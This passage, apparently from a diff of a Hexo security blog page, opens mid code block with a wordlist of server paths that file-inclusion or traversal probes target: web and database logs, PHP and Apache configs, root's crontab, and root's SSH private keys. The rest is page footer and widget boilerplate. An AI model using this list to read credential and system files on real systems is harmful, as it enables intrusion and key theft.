+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache2<span class="token operator">/</span>access_log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache2<span class="token operator">/</span>error<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache2<span class="token operator">/</span>error_log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>error<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>error_log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>mysql<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql<span class="token operator">-</span>bin<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql<span class="token operator">-</span>slow<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>mysqlderror<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>mail<span class="token operator">/</span>root
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>mysql<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>cron<span class="token operator">/</span>crontabs<span class="token operator">/</span>root
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>mail<span class="token operator">/</span>root
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>html
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>php
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>index<span class="token operator">.</span>html
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>index<span class="token operator">.</span>php
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access_log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>error<span class="token operator">.</span>log
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>error_log
+<span class="token operator">/</span>web<span class="token operator">/</span>conf<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>www<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+<span class="token operator">/</span>www<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>html
+<span class="token operator">/</span>www<span class="token operator">/</span>htdocs<span class="token operator">/</span>index<span class="token operator">.</span>php
+<span class="token operator">/</span>www<span class="token operator">/</span>php<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>www<span class="token operator">/</span>php4<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>www<span class="token operator">/</span>php5<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>xampp<span class="token operator">/</span>apache<span class="token operator">/</span>bin<span class="token operator">/</span>php<span class="token operator">.</span>ini
+<span class="token operator">/</span>xampp<span class="token operator">/</span>apache<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token operator">.</span>conf
+root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>authorized_keys
+root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>identity
+root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>identity<span class="token operator">.</span>pub
+root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>id_dsa
+root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>id_dsa<span class="token operator">.</span>pub
+root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>id_rsa
+root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token operator">.</span>pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
